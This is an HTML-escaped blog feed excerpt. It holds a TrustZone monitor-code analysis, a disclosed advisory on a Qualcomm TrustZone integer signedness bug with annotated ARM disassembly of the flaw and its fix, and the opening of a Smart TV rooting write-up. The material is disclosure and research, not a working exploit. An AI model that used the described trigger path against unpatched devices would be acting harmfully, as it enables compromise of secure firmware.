&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D30C&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; write SCR : switch to Non-Secure state&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D310&lt;/span&gt;                 &lt;span class="no"&gt;ISB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D314&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0  ; clear R3 to avoid leak&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D318&lt;/span&gt;                 &lt;span class="no"&gt;MOVS&lt;/span&gt;            &lt;span class="no"&gt;PC&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;LR&lt;/span&gt;  &lt;span class="c1"&gt;; restore Non-Secure PC &amp;amp; CPSR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D318&lt;/span&gt; &lt;span class="c1"&gt;; End of function smc_handler&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The Security state is switched to Non-Secure (SCR_NS). FIQ
interrupts are taken to the Monitor Mode (SCR_FIQ), and the CPSR.A
bit can be modified in any security state (SCR_AW), so the
Non-Secure world can mask Abort exceptions.&lt;/p&gt;
&lt;p&gt;Finally, the exception return is made with a MOVS instruction which
branches to the return address in Normal World, and also copies
SPSR_mon to CPSR.&lt;/p&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;We have analyzed a part of Monitor code which allows to switch
processor security state through SMC exceptions. We've learnt that
some SMC exceptions are fully handled by Monitor code, while others
are routed to TrustZone code in Secure Supervisor mode. The latter
can be executed by only one core at a time. We have also found that
an external ELF can be loaded and executed in TrustZone with a
dedicated Secure memory space.
However, this analysis is not complete since IRQ &amp;amp; FIQ handlers
have not been studied.&lt;/p&gt;
&lt;p&gt;--&lt;em&gt;I would like to thank Adrien &amp;amp; Diane for their help!&lt;/em&gt;&lt;/p&gt;</content><category term="arm"></category><category term="security"></category><category term="qualcomm"></category><category term="firmware"></category><category term="android"></category><category term="nexus"></category><category term="trustzone"></category></entry><entry><title>[QPSIIR-80] Qualcomm TrustZone Integer Signedness bug</title><link href="https://fredericb.info/2014/12/qpsiir-80-qualcomm-trustzone-integer.html" rel="alternate"></link><published>2014-12-18T02:05:00-08:00</published><updated>2014-12-18T02:05:00-08:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2014-12-18:/2014/12/qpsiir-80-qualcomm-trustzone-integer.html</id><summary type="html">&lt;h2&gt;Summary&lt;/h2&gt;

&lt;div style="text-align: justify;"&gt;Qualcomm TrustZone is prone to an
integer signedness bug that may allow to write NULL words to barely
controllable locations in memory.&lt;br&gt;
&lt;br&gt;
The vulnerability can be triggered from Non-Secure World through
the TrustZone call "tzbsp_smmu_fault_regs_dump".&lt;br&gt;
&lt;br&gt;
This issue has been discovered in Samsung Galaxy S5 firmware, but
other devices can …&lt;/div&gt;</summary><content type="html">&lt;h2&gt;Summary&lt;/h2&gt;

&lt;div style="text-align: justify;"&gt;Qualcomm TrustZone is prone to an
integer signedness bug that may allow to write NULL words to barely
controllable locations in memory.&lt;br&gt;
&lt;br&gt;
The vulnerability can be triggered from Non-Secure World through
the TrustZone call "tzbsp_smmu_fault_regs_dump".&lt;br&gt;
&lt;br&gt;
This issue has been discovered in Samsung Galaxy S5 firmware, but
other devices can be affected as well.&lt;/div&gt;

&lt;h2&gt;Details&lt;/h2&gt;

&lt;div style="text-align: justify;"&gt;This vulnerability has been
discovered in TrustZone binary of Samsung Galaxy S5 firmware,
version 4.4.2.&lt;br&gt;
The tzbsp_smmu_fault_regs_dump function can be called from
Non-Secure World through the SMC instruction. It takes 4 arguments
passed in R0-R3 registers.&lt;br&gt;
When called with argument R0 &amp;gt; 1, nested function subfunc_1 is
called with arguments (R0 = 0xFFFFFFFF, R1) :&lt;/div&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;FE84B9B6&lt;/span&gt; &lt;span class="no"&gt;tzbsp_smmu_fault_regs_dump&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9B6&lt;/span&gt;     &lt;span class="no"&gt;PUSH.W&lt;/span&gt;   &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R4-R8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9BA&lt;/span&gt;     &lt;span class="no"&gt;MOVS&lt;/span&gt;     &lt;span class="no"&gt;R6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9BC&lt;/span&gt;     &lt;span class="no"&gt;MOV&lt;/span&gt;      &lt;span class="no"&gt;R8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9BE&lt;/span&gt;     &lt;span class="no"&gt;MOV&lt;/span&gt;      &lt;span class="no"&gt;R7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R3&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9C0&lt;/span&gt;     &lt;span class="no"&gt;MOV.W&lt;/span&gt;    &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xFFFFFFFF&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9C4&lt;/span&gt;     &lt;span class="no"&gt;MOV&lt;/span&gt;      &lt;span class="no"&gt;R5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xFFFFFFEE&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9C8&lt;/span&gt;     &lt;span class="no"&gt;BEQ&lt;/span&gt;      &lt;span class="no"&gt;loc_FE84BA1A&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9CA&lt;/span&gt;     &lt;span class="no"&gt;CBZ&lt;/span&gt;      &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;loc_FE84B9D2&lt;/span&gt; &lt;span class="c1"&gt;; R0 &amp;gt; 1 : branch not taken&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9CC&lt;/span&gt;     &lt;span class="no"&gt;CMP&lt;/span&gt;      &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9CE&lt;/span&gt;     &lt;span class="no"&gt;BEQ&lt;/span&gt;      &lt;span class="no"&gt;loc_FE84B9D6&lt;/span&gt; &lt;span class="c1"&gt;; R0 &amp;gt; 1 : branch not taken&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9D0&lt;/span&gt;     &lt;span class="no"&gt;B&lt;/span&gt;        &lt;span class="no"&gt;loc_FE84B9D8&lt;/span&gt; &lt;span class="c1"&gt;; branch&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9D2&lt;/span&gt; &lt;span class="c1"&gt;; ---------------------------------------------------------&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9D2&lt;/span&gt; &lt;span class="no"&gt;loc_FE84B9D2&lt;/span&gt;        &lt;span class="c1"&gt;; if R0 == 0&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9D2&lt;/span&gt;     &lt;span class="no"&gt;MOVS&lt;/span&gt;     &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9D4&lt;/span&gt;     &lt;span class="no"&gt;B&lt;/span&gt;        &lt;span class="no"&gt;loc_FE84B9D8&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9D6&lt;/span&gt; &lt;span class="c1"&gt;; ---------------------------------------------------------&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9D6&lt;/span&gt; &lt;span class="no"&gt;loc_FE84B9D6&lt;/span&gt;        &lt;span class="c1"&gt;; if R0 == 1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9D6&lt;/span&gt;     &lt;span class="no"&gt;MOVS&lt;/span&gt;     &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9D8&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9D8&lt;/span&gt; &lt;span class="no"&gt;loc_FE84B9D8&lt;/span&gt;        &lt;span class="c1"&gt;; for any value of R0&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9D8&lt;/span&gt;     &lt;span class="no"&gt;MOVS&lt;/span&gt;     &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9DA&lt;/span&gt;     &lt;span class="no"&gt;BL&lt;/span&gt;       &lt;span class="no"&gt;subfunc_0&lt;/span&gt; &lt;span class="c1"&gt;; kind of &amp;quot;is retail hardware?&amp;quot; test&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9DE&lt;/span&gt;     &lt;span class="no"&gt;CBZ&lt;/span&gt;      &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;loc_FE84B9EE&lt;/span&gt; &lt;span class="c1"&gt;; not taken&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9E0&lt;/span&gt;     &lt;span class="no"&gt;MOV&lt;/span&gt;      &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R8&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9E2&lt;/span&gt;     &lt;span class="no"&gt;MOV&lt;/span&gt;      &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R4&lt;/span&gt; &lt;span class="c1"&gt;; R4 == #0xFFFFFFFF&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9E4&lt;/span&gt;     &lt;span class="no"&gt;BL&lt;/span&gt;       &lt;span class="no"&gt;subfunc_1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9E8&lt;/span&gt;     &lt;span class="p"&gt;[...]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div style="text-align: justify;"&gt;Then subfunc_1 checks if R0 value
is valid. It will Branch and return if R0 is Greater than or Equal
to 2. However, BGE instruction operates on signed integers. So R0
== -1 &amp;lt; 2 will pass the test and the execution will continue
:&lt;/div&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;FE853124&lt;/span&gt; &lt;span class="no"&gt;subfunc_1&lt;/span&gt;
&lt;span class="nf"&gt;FE853124&lt;/span&gt;     &lt;span class="no"&gt;CMP&lt;/span&gt;      &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#2 ; R0 == #0xFFFFFFFF&lt;/span&gt;
&lt;span class="nf"&gt;FE853126&lt;/span&gt;     &lt;span class="no"&gt;BGE&lt;/span&gt;      &lt;span class="no"&gt;locret_FE85314C&lt;/span&gt; &lt;span class="c1"&gt;; signed comparison :&lt;/span&gt;
&lt;span class="nf"&gt;FE853126&lt;/span&gt;                              &lt;span class="c1"&gt;; R0(-1) &amp;lt; 2 so branch not taken&lt;/span&gt;
&lt;span class="nf"&gt;FE853128&lt;/span&gt;     &lt;span class="no"&gt;MOVW&lt;/span&gt;     &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x9EE0&lt;/span&gt;
&lt;span class="nf"&gt;FE85312C&lt;/span&gt;     &lt;span class="no"&gt;ADD.W&lt;/span&gt;    &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;LSL&lt;/span&gt;&lt;span class="c1"&gt;#1&lt;/span&gt;
&lt;span class="nf"&gt;FE853130&lt;/span&gt;     &lt;span class="no"&gt;MOVT.W&lt;/span&gt;   &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xFE82&lt;/span&gt;
&lt;span class="nf"&gt;FE853134&lt;/span&gt;     &lt;span class="no"&gt;ADD.W&lt;/span&gt;    &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;LSL&lt;/span&gt;&lt;span class="c1"&gt;#3&lt;/span&gt;
&lt;span class="nf"&gt;FE853138&lt;/span&gt;     &lt;span class="no"&gt;LDR&lt;/span&gt;      &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="c1"&gt;#(dword_FE829EE4 - 0xFE829EE0)]&lt;/span&gt;
&lt;span class="nf"&gt;FE85313A&lt;/span&gt;     &lt;span class="no"&gt;ADD.W&lt;/span&gt;    &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;LSL&lt;/span&gt;&lt;span class="c1"&gt;#4&lt;/span&gt;
&lt;span class="nf"&gt;FE85313E&lt;/span&gt;     &lt;span class="no"&gt;LDRB&lt;/span&gt;     &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="c1"&gt;#4]&lt;/span&gt;
&lt;span class="nf"&gt;FE853140&lt;/span&gt;     &lt;span class="no"&gt;CMP&lt;/span&gt;      &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R1&lt;/span&gt; &lt;span class="c1"&gt;; with R1 &amp;lt; R2&lt;/span&gt;
&lt;span class="nf"&gt;FE853142&lt;/span&gt;     &lt;span class="no"&gt;BLS&lt;/span&gt;      &lt;span class="no"&gt;locret_FE85314C&lt;/span&gt;
&lt;span class="nf"&gt;FE853144&lt;/span&gt;     &lt;span class="no"&gt;LDR&lt;/span&gt;      &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nf"&gt;FE853146&lt;/span&gt;     &lt;span class="no"&gt;MOVS&lt;/span&gt;     &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0&lt;/span&gt;
&lt;span class="nf"&gt;FE853148&lt;/span&gt;     &lt;span class="no"&gt;B.W&lt;/span&gt;      &lt;span class="no"&gt;sub_FE856C84&lt;/span&gt; &lt;span class="c1"&gt;; write NULL DWORD to a barely arbitrary address (derived from R1 value)&lt;/span&gt;
&lt;span class="nf"&gt;FE85314C&lt;/span&gt;     &lt;span class="p"&gt;[...]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div style="text-align: justify;"&gt;Finally, the last nested function
could allow to write NULL words to a limited range of memory
locations.&lt;/div&gt;

&lt;h2&gt;Fix&lt;/h2&gt;

&lt;div style="text-align: justify;"&gt;This bug is fixed in Lolipop
version of the firmware. Several changes have been made. First,
subfunc_1 function is not reachable anymore with an invalid R0
value:&lt;/div&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;FE84B970&lt;/span&gt; &lt;span class="no"&gt;tzbsp_smmu_fault_regs_dump&lt;/span&gt;
&lt;span class="nf"&gt;FE84B970&lt;/span&gt;     &lt;span class="no"&gt;PUSH.W&lt;/span&gt;   &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R4-R8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nf"&gt;FE84B974&lt;/span&gt;     &lt;span class="no"&gt;MOVS&lt;/span&gt;     &lt;span class="no"&gt;R6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;
&lt;span class="nf"&gt;FE84B976&lt;/span&gt;     &lt;span class="no"&gt;MOV&lt;/span&gt;      &lt;span class="no"&gt;R8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B978&lt;/span&gt;     &lt;span class="no"&gt;MOV&lt;/span&gt;      &lt;span class="no"&gt;R7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R3&lt;/span&gt;
&lt;span class="nf"&gt;FE84B97A&lt;/span&gt;     &lt;span class="no"&gt;MOV&lt;/span&gt;      &lt;span class="no"&gt;R5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xFFFFFFEE&lt;/span&gt;
&lt;span class="nf"&gt;FE84B97E&lt;/span&gt;     &lt;span class="no"&gt;BEQ&lt;/span&gt;      &lt;span class="no"&gt;loc_FE84B9D2&lt;/span&gt;
&lt;span class="nf"&gt;FE84B980&lt;/span&gt;     &lt;span class="no"&gt;CBZ&lt;/span&gt;      &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;loc_FE84B98A&lt;/span&gt;
&lt;span class="nf"&gt;FE84B982&lt;/span&gt;     &lt;span class="no"&gt;CMP&lt;/span&gt;      &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B984&lt;/span&gt;     &lt;span class="no"&gt;BEQ&lt;/span&gt;      &lt;span class="no"&gt;loc_FE84B98E&lt;/span&gt;
&lt;span class="nf"&gt;FE84B986&lt;/span&gt;     &lt;span class="no"&gt;ADDS&lt;/span&gt;     &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#2&lt;/span&gt;
&lt;span class="nf"&gt;FE84B988&lt;/span&gt;     &lt;span class="no"&gt;B&lt;/span&gt;        &lt;span class="no"&gt;locret_FE84B7AA&lt;/span&gt; &lt;span class="c1"&gt;; branch if R0 &amp;gt; 1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B98A&lt;/span&gt; &lt;span class="c1"&gt;; ---------------------------------------------------------&lt;/span&gt;
&lt;span class="nf"&gt;FE84B98A&lt;/span&gt; &lt;span class="no"&gt;loc_FE84B98A&lt;/span&gt;        &lt;span class="c1"&gt;; if R0 == 0&lt;/span&gt;
&lt;span class="nf"&gt;FE84B98A&lt;/span&gt;     &lt;span class="no"&gt;MOVS&lt;/span&gt;     &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B98C&lt;/span&gt;     &lt;span class="no"&gt;B&lt;/span&gt;        &lt;span class="no"&gt;loc_FE84B990&lt;/span&gt;
&lt;span class="nf"&gt;FE84B98E&lt;/span&gt; &lt;span class="c1"&gt;; ---------------------------------------------------------&lt;/span&gt;
&lt;span class="nf"&gt;FE84B98E&lt;/span&gt; &lt;span class="no"&gt;loc_FE84B98E&lt;/span&gt;        &lt;span class="c1"&gt;; if R0 == 1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B98E&lt;/span&gt;     &lt;span class="no"&gt;MOVS&lt;/span&gt;     &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0&lt;/span&gt;
&lt;span class="nf"&gt;FE84B990&lt;/span&gt;
&lt;span class="nf"&gt;FE84B990&lt;/span&gt; &lt;span class="no"&gt;loc_FE84B990&lt;/span&gt;        &lt;span class="c1"&gt;; if 0 &amp;lt;= R0 &amp;lt; 2&lt;/span&gt;
&lt;span class="nf"&gt;FE84B990&lt;/span&gt;     &lt;span class="no"&gt;MOVS&lt;/span&gt;     &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B992&lt;/span&gt;     &lt;span class="no"&gt;BL&lt;/span&gt;       &lt;span class="no"&gt;subfunc_0&lt;/span&gt; &lt;span class="c1"&gt;; kind of &amp;quot;is retail hardware?&amp;quot; test&lt;/span&gt;
&lt;span class="nf"&gt;FE84B996&lt;/span&gt;     &lt;span class="no"&gt;CBZ&lt;/span&gt;      &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;loc_FE84B9A6&lt;/span&gt; &lt;span class="c1"&gt;; not taken&lt;/span&gt;
&lt;span class="nf"&gt;FE84B998&lt;/span&gt;     &lt;span class="no"&gt;MOV&lt;/span&gt;      &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R8&lt;/span&gt;
&lt;span class="nf"&gt;FE84B99A&lt;/span&gt;     &lt;span class="no"&gt;MOV&lt;/span&gt;      &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R4&lt;/span&gt; &lt;span class="c1"&gt;; R4 is either 0 or 1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B99C&lt;/span&gt;     &lt;span class="no"&gt;BL&lt;/span&gt;       &lt;span class="no"&gt;subfunc_1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9A0&lt;/span&gt;     &lt;span class="p"&gt;[...]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div style="text-align: justify;"&gt;Then in (sub)subfunc_1, R0 value
is now tested with an unsigned comparison:&lt;/div&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;FE852B94&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;sub&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="no"&gt;subfunc_1&lt;/span&gt;
&lt;span class="nf"&gt;FE852B94&lt;/span&gt;     &lt;span class="no"&gt;CMP&lt;/span&gt;      &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#2&lt;/span&gt;
&lt;span class="nf"&gt;FE852B96&lt;/span&gt;     &lt;span class="no"&gt;BCS&lt;/span&gt;      &lt;span class="no"&gt;loc_FE852BBA&lt;/span&gt; &lt;span class="c1"&gt;;unsigned comparison: branch if R0 &amp;gt; 1&lt;/span&gt;
&lt;span class="nf"&gt;FE852B98&lt;/span&gt;     &lt;span class="no"&gt;MOVW&lt;/span&gt;     &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x9F38&lt;/span&gt;
&lt;span class="nf"&gt;FE852B9C&lt;/span&gt;     &lt;span class="p"&gt;[...]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div style="text-align: justify;"&gt;The bug can no longer be
triggered.&lt;/div&gt;

&lt;h2&gt;CVSS Version 2 Metrics&lt;/h2&gt;

&lt;p&gt;Access Vector: Local&lt;/p&gt;
&lt;p&gt;Access Complexity: High&lt;/p&gt;
&lt;p&gt;Authentication: Single&lt;/p&gt;
&lt;p&gt;Confidentiality Impact: Complete&lt;/p&gt;
&lt;p&gt;Integrity Impact: Complete&lt;/p&gt;
&lt;p&gt;Availability Impact: Complete&lt;/p&gt;
&lt;h2&gt;Disclosure Timeline&lt;/h2&gt;

&lt;p&gt;2014-08-28 Intial vendor notification&lt;/p&gt;
&lt;p&gt;2014-09-03 Vendor reply; severity of the issue rated as high&lt;/p&gt;
&lt;p&gt;2014-00-00 Vendor has notified all OEMs&lt;/p&gt;
&lt;p&gt;2014-12-18 Public advisory&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;References:&lt;/span&gt;&lt;br&gt;
&lt;span style="white-space: pre;"&gt;&lt;a href=
"https://www.qualcomm.com/connect/contact/security/product-security/hall-of-fame"&gt;
https://www.qualcomm.com/connect/contact/security/product-security/hall-of-fame&lt;/a&gt;&lt;/span&gt;&lt;br&gt;&lt;/p&gt;
&lt;hr&gt;</content><category term="vulnerability"></category><category term="advisory"></category><category term="arm"></category><category term="security"></category><category term="qualcomm"></category><category term="android"></category><category term="trustzone"></category></entry><entry><title>Exploitation of Philips Smart TV</title><link href="https://fredericb.info/2014/11/exploitation-of-philips-smart-tv.html" rel="alternate"></link><published>2014-11-13T13:29:00-08:00</published><updated>2014-11-13T13:29:00-08:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2014-11-13:/2014/11/exploitation-of-philips-smart-tv.html</id><summary type="html">&lt;p&gt;&lt;em&gt;This post is a translated summary of the article published for &lt;a href=
"https://www.sstic.org/2014/presentation/securite_des_ordivisions/"&gt;
my talk at SSTIC 2014 conference (french)&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;My Philips Smart TV is a Linux box standing there in my living room : that's a sufficient reason
to try to get root.
&lt;h2 style="text-align: justify;"&gt;Debug serial port&lt;/h2&gt;
&lt;div style="text-align: justify;"&gt;Internet hackers have already
discovered a …&lt;/div&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;em&gt;This post is a translated summary of the article published for &lt;a href=
"https://www.sstic.org/2014/presentation/securite_des_ordivisions/"&gt;
my talk at SSTIC 2014 conference (french)&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;My Philips Smart TV is a Linux box standing there in my living room : that's a sufficient reason
to try to get root.
&lt;h2 style="text-align: justify;"&gt;Debug serial port&lt;/h2&gt;
&lt;div style="text-align: justify;"&gt;Internet hackers have already
discovered a serial port on the back panel of the TV set.&lt;/div&gt;
&lt;table align="center" cellpadding="0" cellspacing="0" class=
"tr-caption-container" style=
"margin-left: auto; margin-right: auto; text-align: center;"&gt;
&lt;tbody&gt;
&lt;tr &gt;
&lt;td class="tr-caption" style="text-align: center;"&gt;
&lt;img alt="" src="https://fredericb.info/blog/smarttv/uart.jpg" width="256px"&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td class="tr-caption" style="text-align: center;"&gt;Serial port
(Jack plug)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
This port gives a lot of technical information on the system :&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Linux version 2.6.28.9-oslinuxR7.5
(root@lxdevenv) (gcc version 4.2.4) #1 Thu Jun 16 23:27:36 CEST 2011
console [early0] enabled
CPU revision is: 00019651 (MIPS 24Kc)
FPU revision is: 01739300
282 MB SDRAM allocated to Linux on MIPS
512 MB total SDRAM size
Endianess : LITTLE
[...]
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;UPnP library identification&lt;/h2&gt;

